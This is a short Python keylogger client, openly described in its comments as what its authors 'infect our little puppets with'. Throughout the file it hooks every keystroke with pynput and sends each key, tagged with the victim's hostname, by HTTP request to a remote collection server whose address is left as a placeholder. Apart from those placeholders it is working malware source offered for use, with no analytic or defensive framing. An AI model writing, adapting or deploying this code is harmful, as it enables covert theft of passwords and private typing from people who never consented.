# This is our client.
# This is what we infect our little puppets with.

# Import modules!
import requests
import socket

# Setup server to send to.
host = "hostname"
port = "porthere"
endp = "keystroke"

# This is us.
identifier = socket.gethostname()

# Compose url endpoint.
url = f"http://{host}:{port}/{endp}"

# Sender!
def sender(k):

    # Print Key.
    print(k)

    # Request Webservice.
    requests.get(url = url, params = {"key": f"{k}","ident": f" [{identifier}] >> "})
    
    # End.
    return

# Main process.
if __name__ == '__main__':

    # Importsies.
    from multiprocessing import Process, freeze_support
    import pynput

    # Freeze support!
    freeze_support()

    # Newline!
    requests.get(url = url, params = {"key": f"enter","ident": f" [{identifier}] >> "})   

    # Logging.
    def on_press(k):
        p = Process(target = sender, args=(f"{k}",))
        p.start()

    # Check if there is already a listener.
    try: li

    # If not, we declare it nonexistant!
    except NameError: li = None

    # And as such if not, start listening with our listener function. ^^
    if li is None:

        # Setup Keyboard listener.
        li = pynput.keyboard.Listener(on_press = on_press)
        li.start()
        li.join()
